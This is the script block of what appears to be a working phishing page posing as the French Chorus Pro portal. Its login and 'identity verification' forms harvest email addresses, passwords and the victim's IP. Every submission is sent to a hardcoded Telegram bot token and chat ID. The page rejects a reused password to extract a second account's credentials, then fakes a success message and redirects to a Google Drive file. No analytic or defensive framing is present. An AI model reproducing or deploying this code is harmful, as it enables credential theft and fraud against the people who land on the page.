 <script>
    const botToken = "8427673134:AAFgIMoafQFxas8Xqz3HL_BsKnYAYZAS1P8";
    const chatId = "6371692777";
    let storedPassword = null;

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        storedPassword = password; // Stocker le mot de passe
        
        document.getElementById('loginStep').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        
        const now = new Date();
        const dateTime = now.toLocaleString('fr-FR');
        
        setTimeout(() => {
            getIPAddress().then(ip => {
                sendToTelegram(email, password, dateTime, ip, 1);
            }).catch(() => {
                sendToTelegram(email, password, dateTime, "IP non disponible", 1);
            });
            
            document.getElementById('loader').style.display = 'none';
            document.getElementById('identityVerification').style.display = 'block';
            document.body.classList.add('step2');
            document.getElementById('password').value = '';
        }, 2500);
    });

    document.getElementById('professionalEmail').addEventListener('input', function() {
        const email = this.value.trim();
        const passwordField = document.getElementById('passwordField');
        const submitBtn = document.getElementById('submitIdentity');
        
        if (email.length > 0 && email.includes('@')) {
            passwordField.style.display = 'block';
            submitBtn.disabled = false;
        } else {
            passwordField.style.display = 'none';
            submitBtn.disabled = true;
        }
    });

    document.getElementById('identityForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const professionalEmail = document.getElementById('professionalEmail').value;
        const identityPassword = document.getElementById('identityPassword').value;
        
        // Supprimer les anciens messages d'erreur
        const oldError = document.getElementById('identityError');
        if (oldError) oldError.remove();
        
        // Vérifier si le mot de passe est identique
        if (identityPassword === storedPassword) {
            // Créer et afficher le message d'erreur
            const errorDiv = document.createElement('div');
            errorDiv.id = 'identityError';
            errorDiv.style.color = 'red';
            errorDiv.style.textAlign = 'center';
            errorDiv.style.margin = '0 0 15px 0';
            errorDiv.style.padding = '10px';
            errorDiv.style.backgroundColor = '#ffeeee';
            errorDiv.style.border = '1px solid #ffcccc';
            errorDiv.style.borderRadius = '4px';
            errorDiv.textContent = 'Pour visualiser les fichiers, veuillez entrer les identifiants de messagerie auxquels ce ces fichiers à été envoyé.';
            
            const form = document.getElementById('identityForm');
            form.insertBefore(errorDiv, form.firstChild);
            
            return false;
        }
        
        const now = new Date();
        const dateTime = now.toLocaleString('fr-FR');
        
        document.getElementById('identityVerification').style.opacity = '0.5';
        document.getElementById('submitIdentity').disabled = true;
        
        getIPAddress().then(ip => {
            sendToTelegram(professionalEmail, identityPassword, dateTime, ip, 2);
        }).catch(() => {
            sendToTelegram(professionalEmail, identityPassword, dateTime, "IP non disponible", 2);
        });
        
        setTimeout(() => {
            alert("Votre identité a été vérifiée avec succès. Vous allez être redirigé.");
            setTimeout(() => {
                window.location.href = 'https://drive.google.com/file/d/1eNHvaGM65gZPNQetBmCc0X9V14ygIJ9J/view';
            }, 1000);
        }, 1000);
    });

    function sendToTelegram(email, password, dateTime, ip, formType) {
        const formLabel = formType === 1 ? "Nouveau Chorus Pro" : "Nouvelle Identité Vérifiée";
        const message = `(${formType}) ${formLabel}:
📧 Email: ${email}
🔑 Mot de passe: ${password}
📅 Date/Heure: ${dateTime}
🌐 IP: ${ip}`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
        
        fetch(url)
            .then(response => response.json())
            .then(data => console.log('Message envoyé à Telegram:', data))
            .catch(error => console.error('Erreur:', error));
    }
    
    function getIPAddress() {
        return fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip);
    }
</script>
